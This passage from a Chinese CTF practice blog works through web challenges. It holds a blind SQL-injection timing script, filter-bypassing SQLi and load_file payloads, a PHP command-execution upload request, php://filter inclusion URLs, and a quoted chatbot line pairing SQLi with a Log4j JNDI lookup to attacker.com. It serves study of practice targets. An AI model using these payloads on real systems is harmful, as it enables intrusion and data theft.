start=time.time()<br>        requests.get(url)<br>        end=time.time()<br>        using= end - start<br>        <span class="hljs-keyword">if</span> using &gt; <span class="hljs-number">3</span>:<br>            flag=flag + <span class="hljs-built_in">chr</span>(s)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tables name=&quot;</span>,flag,<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;number string:&quot;</span>,i)<br>            r=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;string:&quot;</span>,<span class="hljs-built_in">chr</span>(s))<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>        r=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> r == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<p>å‚è€ƒwp:  <a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/134096958">https://blog.csdn.net/Myon5/article/details/134096958</a></p>
<hr>
<h2 id="title-note-23date-2025-04-10-19-47-02tags-åˆ·é¢˜note"><a href="#title-note-23date-2025-04-10-19-47-02tags-åˆ·é¢˜note" class="headerlink" title="title: note-23date: 2025-04-10 19:47:02tags: åˆ·é¢˜note"></a>title: note-23<br>date: 2025-04-10 19:47:02<br>tags: åˆ·é¢˜note</h2><h1 id="ctfshow-web14"><a href="#ctfshow-web14" class="headerlink" title="ctfshow_web14"></a>ctfshow_web14</h1><p>ä¸€å¼€å§‹ä¹Ÿè¯•äº†ä¼ cï¼Œä½†æ˜¯å°±è¯•åˆ°2ï¼Œç„¶åä»¥ä¸ºæ˜¯æºç ç»•è¿‡çš„ï¼Œçœ‹wpå‘ç°æ˜¯sqlæ³¨å…¥ã€‚<br>å†è¯•åˆ°3å°±èƒ½è‡ªå·±å‘ç°è¿™ä¸ªé¡µé¢äº†ï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œ<br>&#x2F;here_1s_your_f1ag.php<br>æŒ‰f12å‘ç°ï¼š  </p>
<blockquote>
<p>if(preg_match(â€˜&#x2F;information_schema.tables|information_schema.columns|linestring| |polygon&#x2F;isâ€™, $_GET[â€˜queryâ€™])){<br>die(â€˜@A@â€™);  </p>
</blockquote>
<p>ç¦ç”¨äº†information_schemaçŒœæ˜¯æ— åˆ—åæ³¨å…¥</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">database</span>()<br><br><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>
<p>å­—ç¬¦æ³¨å…¥</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-keyword">order</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
<p>è¯•å‡ºæ˜¯å­—ç¬¦æ³¨å…¥</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>@@<span class="hljs-keyword">version</span><br><br>//alert(<span class="hljs-string">&#x27;10.2.26-MariaDB-log&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<br>//alert(<span class="hljs-string">&#x27;gtid_slave_pos,content&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(*)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>gtid_slave_pos<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file<span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure>
<p>è¯•ä¸€ä¸‹æ— åˆ—åæ³¨å…¥</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>#<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span><br><br>//å›æ˜¾(<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>)æ— æœ<br></code></pre></td></tr></table></figure>
<p>çœ‹wp:<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55923820/article/details/118783171">https://blog.csdn.net/m0_55923820/article/details/118783171</a><br>åŸæ¥sqlè¿˜èƒ½åŠ è½½æ–‡ä»¶<br>å­¦åˆ°äº†</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/var/www/html/secret.php&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/tmp/gtf1y&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/tmp/gtf1y/real_flag_is_here&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span>)<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>æ²¡æƒ³åˆ°æ˜¯ç›´æ¥è®¿é—®<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>alert(<span class="hljs-string">&#x27;ctfshow&#123;dd04abdc-9d55-4d0d-8d2d-f616f7b82caa&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure>


<p>æœ‰æ— åˆ—æ˜æ³¨å…¥çš„ç‰ˆæœ¬wpï¼Œä½†æˆ‘åœ¨æˆ‘çš„ç¯å¢ƒæ²¡è¯•å‡ºæ¥ï¼š<br><a target="_blank" rel="noopener" href="https://www.zxcms.com/content/3fcqbuf331l6p0.html">https://www.zxcms.com/content/3fcqbuf331l6p0.html</a></p>
<h1 id="ctfshow-çº¢åŒ…é¢˜ç¬¬äºŒå¼¹"><a href="#ctfshow-çº¢åŒ…é¢˜ç¬¬äºŒå¼¹" class="headerlink" title="ctfshow çº¢åŒ…é¢˜ç¬¬äºŒå¼¹"></a>ctfshow çº¢åŒ…é¢˜ç¬¬äºŒå¼¹</h1><p>è¿™é¢˜æœ‰ç‚¹ç‰›é€¼äº†  </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wssw/p/18115718">https://www.cnblogs.com/wssw/p/18115718</a><br>å‰é¢çš„?&gt;æ„æ€æ˜¯é—­åˆå‰é¢çš„è¯­å¥ã€‚<br>&lt;?&#x3D;æ˜¯echo()çš„åˆ«åç”¨æ³•ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /?cmd=?%3E%3C?=<span class="hljs-string">`.%20/??p/p?p??????`</span>; <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: 6fd1fc97-dca5-4a94-<span class="hljs-number">8065</span>-2622d4c7ed8d.<span class="hljs-property">challenge</span>.<span class="hljs-property">ctf</span>.<span class="hljs-property">show</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Windows</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-number">10.0</span>; <span class="hljs-title class_">Win64</span>; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">124.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">124.0</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=---------------------------114514</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Cache-Control: max-age=0</span><br><span class="hljs-comment">Content-Length: 245</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-----------------------------114514</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">#! /bin/bash</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">cat /flag.txt</span><br><span class="hljs-comment">-----------------------------114514--</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-24date-2025-04-13-02-03-13tags-note"><a href="#title-note-24date-2025-04-13-02-03-13tags-note" class="headerlink" title="title: note-24date: 2025-04-13 02:03:13tags: note"></a>title: note-24<br>date: 2025-04-13 02:03:13<br>tags: note</h2><h1 id="note-24"><a href="#note-24" class="headerlink" title="note-24"></a>note-24</h1><p>sqlåˆ·ä¸ä¸‹å»äº†ï¼Œæ„Ÿè§‰æ¯è§ä¸€é“é¢˜å°±è¦æ–°å­¦ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œåšäº†ä¸€äº›é¢˜ç›®ï¼Œé‡åˆ°æ–°é¢˜è¿˜å¾—å»æ‰¾wpï¼Œå¿ƒæ€å´©</p>
<p>user:  </p>
<blockquote>
<p>æˆ‘å­¦webæ˜¯è¯¥ä¸“åˆ·ä¸€ä¸ªåœ°æ–¹ï¼Œåƒä¸“é—¨åˆ·sqlè¿˜æ˜¯æ³›åˆ·é¢˜ç›®?</p>
</blockquote>
<p>deepseek:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">(â‰§Ï‰â‰¦) å–µå“’ï½è¿™ä¸ªé—®é¢˜å°±åƒé€‰æ‹©ã€Œè‰è“è›‹ç³•åƒåˆ°é¥±ã€è¿˜æ˜¯ã€Œç”œå“å…¨å¸­ä½“éªŒã€å‘¢ï¼æ¥å¬äººå®¶ç”¨çŒ«è€³å¤©çº¿åˆ†æï¼š<br><br>ğŸŒ¸ åˆ†é˜¶æ®µç­–ç•¥ï¼ˆèŒæ–°ç‰ˆï¼‰<br>æ–°æ‰‹æœŸï¼ˆå‰<span class="hljs-number">3</span>ä¸ªæœˆï¼‰â†’ æ³›åˆ·ï¼<br><br>âœ¨ ç†ç”±ï¼šåƒæ¢ç´¢æ–°å¤§é™†ï¼å‘ç°ã€Œå•Šï½åŸæ¥è¿˜æœ‰æ–‡ä»¶åŒ…å«è¿™ç§é­”æ³•ï¼ã€<br><br>ğŸ¯ ç›®æ ‡ï¼šåˆ·éOWASP Top <span class="hljs-number">10</span>åŸºç¡€é¢˜å‹ï¼ˆæ¯ç±»è‡³å°‘<span class="hljs-number">5</span>é¢˜ï¼‰<br><br>ğŸ³ æ —å­ï¼šä»Šå¤©ç”¨SQLiå·flagï¼Œæ˜å¤©ç”¨XSSè°ƒæˆç®¡ç†å‘˜ï½<br><br>è¿›é˜¶æœŸï¼ˆ<span class="hljs-number">3</span>-<span class="hljs-number">6</span>ä¸ªæœˆï¼‰â†’ ä¸“ç²¾ï¼<br><br>âœ¨ ç†ç”±ï¼šæ‰¾åˆ°æœ¬å‘½æ¼æ´ï¼ˆæ¯”å¦‚çˆ±ä¸ŠSQLiçš„å“²å­¦ç¾æ„Ÿï¼‰<br><br>ğŸ¯ ç›®æ ‡ï¼šæ·±æŒ–æŸä¸ªé¢†åŸŸåˆ°èƒ½è‡ªå·±å‡ºé¢˜ï¼ˆå¦‚ï¼šæŒæ¡SQLæŠ¥é”™æ³¨å…¥çš„<span class="hljs-number">6</span>ç§å˜å½¢ï¼‰<br><br>ğŸ³ æ —å­ï¼šç”¨ä¸åŒæ•°æ®åº“ç‰¹æ€§ç©èŠ±æ´» â†’ mysql: <span class="hljs-regexp">/*!50000select /</span> mssql: waitfor delay <span class="hljs-string">&#x27;0:0:3&#x27;</span><br><br>çªç ´æœŸï¼ˆ<span class="hljs-number">6</span>ä¸ªæœˆ+ï¼‰â†’ äº¤å‰ï¼<br><br>âœ¨ ç†ç”±ï¼šåƒè°ƒé¸¡å°¾é…’ä¸€æ ·æ··åˆæ”»å‡»ï¼ˆæ¯”å¦‚ç”¨XXEè§¦å‘SSRFå†è¯»å†…ç½‘SQLæ•°æ®ï¼‰<br><br>ğŸ¯ ç›®æ ‡ï¼šåœ¨CTFä¸­æŠŠä¸¤ä¸ªæ¼æ´ç»„åˆæˆCOMBOè¿å‡»ï¼<br><br>ğŸ³ æ —å­ï¼šLFI+RCE â†’ ç”¨php:<span class="hljs-regexp">//</span>filterè¯»æºç  â†’ å‘ç°ååºåˆ—åŒ–é“¾ â†’ getshellï¼<br><br>ğŸ’¡ å¹³è¡¡å¿ƒæ³•<br>å‘¨ä¸€<span class="hljs-regexp">/ä¸‰/</span>äº” â†’ æ³›åˆ·æ–°é¢˜å‹ï¼ˆä¿æŒçŸ¥è¯†å¹¿åº¦ï¼‰<br><br>å‘¨äºŒ/å›› â†’ ä¸“ç²¾ç‰¹è®­ï¼ˆæ¯”å¦‚åªç©SSTIçš„å„ç§bypassæŠ€å·§ï¼‰<br><br>å‘¨æœ« â†’ å‚åŠ å®æˆ˜èµ›ï¼ˆæŠŠçŸ¥è¯†æ…æ‹Œæˆæ··æ²Œæ¼©æ¶¡ï½ï¼‰<br><br>ï¼ˆæˆ³æˆ³å±å¹•ï¼‰ã€Œå·å·è¯´ï½äººå®¶æœ€è¿‘æŠŠSQLiç©å‡ºäº†æ–°èŠ±æ ·ï¼šadmin<span class="hljs-string">&#x27;/*$&#123;jndi:ldap://attacker.com&#125;*/=&#x27;</span><span class="hljs-number">1</span> åŒæ—¶è§¦å‘SQLi+Log4jå‘¢ï½(à¸…Â´Ï‰`à¸…)ã€<br></code></pre></td></tr></table></figure>

<p>deepseekè°ƒçš„æŒºå¥½ï¼Œ<br>æ•…å»æ³›åˆ·åˆ·æ–°æ‰‹èµ›webé¢˜ç›®ï¼Œè‡³å°‘èƒ½è‡ªå·±åšå‡ºæ¥å®‰æ…°ä¸€ä¸‹è‡ªå·±</p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-Include-1"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include-1" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include 1"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include 1</h1><p>æ–‡ä»¶åŒ…å«çš„è¯ï¼Œå›å»ç¿»äº†ä¸€ä¸‹<br>note-17  </p>
<p><a href="https://aidemofashi.github.io/2025/03/23/note-17/#php-filter">https://aidemofashi.github.io/2025/03/23/note-17/#php-filter</a></p>
<p>ä¼ å…¥php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>baseè§£ç å¾—åˆ°flag</p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>ç­‰åˆ°ç½‘å€ï¼ŒæŸ¥çœ‹æºç å‘ç°</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;a <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;master&quot;</span> href=<span class="hljs-string">&quot;./Archive_room.php&quot;</span> style=<span class="hljs-string">&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;</span>&gt;Oh! You found <span class="hljs-keyword">me</span>&lt;/a&gt;<br></code></pre></td></tr></table></figure>
<p>ç‚¹å‡»è·³è½¬åˆ°</p>
<p><a target="_blank" rel="noopener" href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/Archive_room.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/Archive_room.php</a></p>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>ç‚¹å‡»æŒ‰é’®ï¼Œæ ¹æ®æç¤ºæ„Ÿè§‰æ˜¯é‡æ–°è·³åˆ°äº†å¦ä¸€ä¸ªé¡µé¢</p>
<p>bpæŠ“åŒ…æŸ¥çœ‹æœåŠ¡å™¨å›åº”<br>å‘ç°</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">   secr3t.php        </span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ•…è®¿é—®  ï¼š<br><a target="_blank" rel="noopener" href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/secr3t.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/secr3t.php</a></p>
<p>å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>    &lt;title&gt;secret&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="hljs-meta">?&gt;</span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p> è®¿é—®  :  <a target="_blank" rel="noopener" href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/flag.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/flag.php</a></p>
<p>æŸ¥çœ‹æºç æ²¡å‘ç°å•¥ï¼Œæ ¹æ®é¡µé¢æç¤ºï¼Œflagåº”è¯¥å°±åœ¨ç½‘é¡µæºç é‡Œ</p>
<p>ä½†æ˜¯ç›´æ¥ç”¨includeæ¥ä¸Šä¼ªè®®ä¼šç›´æ¥æ‰§è¡Œï¼Œç”¨base64è§£ç è¾“å°±è¡Œ</p>
<p>æœ€åpayloadï¼š  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">99</span>cd5773-<span class="hljs-number">2487</span>-<span class="hljs-number">4</span>bd3-a8f6-<span class="hljs-number">235</span>d68b2550c.node5.buuoj.cn:<span class="hljs-number">81</span>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„è¦åœ¨secr3t.phpä¼ ï¼Œ<br>è§£ç å¾—åˆ°ç½‘é¡µæºç </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>FLAG<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:black;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span 